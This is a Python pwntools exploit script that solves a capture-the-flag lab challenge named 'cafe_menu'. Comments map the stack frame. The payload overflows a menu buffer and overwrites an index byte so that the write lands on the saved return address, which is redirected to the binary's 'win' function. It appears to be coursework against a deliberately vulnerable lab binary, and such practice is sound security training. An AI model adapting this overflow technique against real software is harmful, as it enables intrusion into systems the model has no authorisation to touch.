from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13596

elf = ELF('/home/kali/Desktop/offsec/labs/lab2/challenges/04_cafe_menu/cafe_menu')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

#48th char will write on the index
#so 47 char, index that i want to write on ret, win address in ret

# menu (0) | ... | menu(47) | index (0) = 0x30| index (1) | ... | index(4)

#info frame:
#rbp at 0x7fffffffdc50, rip at 0x7fffffffdc58
#data.menu starts at rbp - 0x40
#offset from data.menu to saved rip is 0x40 (covers all menu + index) + 8 (bp)

offset_ret = 0x48
win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")


rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

r = conn()

r.recvuntil(b"Enter today's specials (send 0xff to finish):\n")

payload = flat(
    b"A" * 48,
    p8(offset_ret-1),   #in index, -1 bc the loop already increments by 1
    #p64(ret_gadget),
    p64(win_addr),
    b"\xff"
)
r.send(payload)
r.interactive()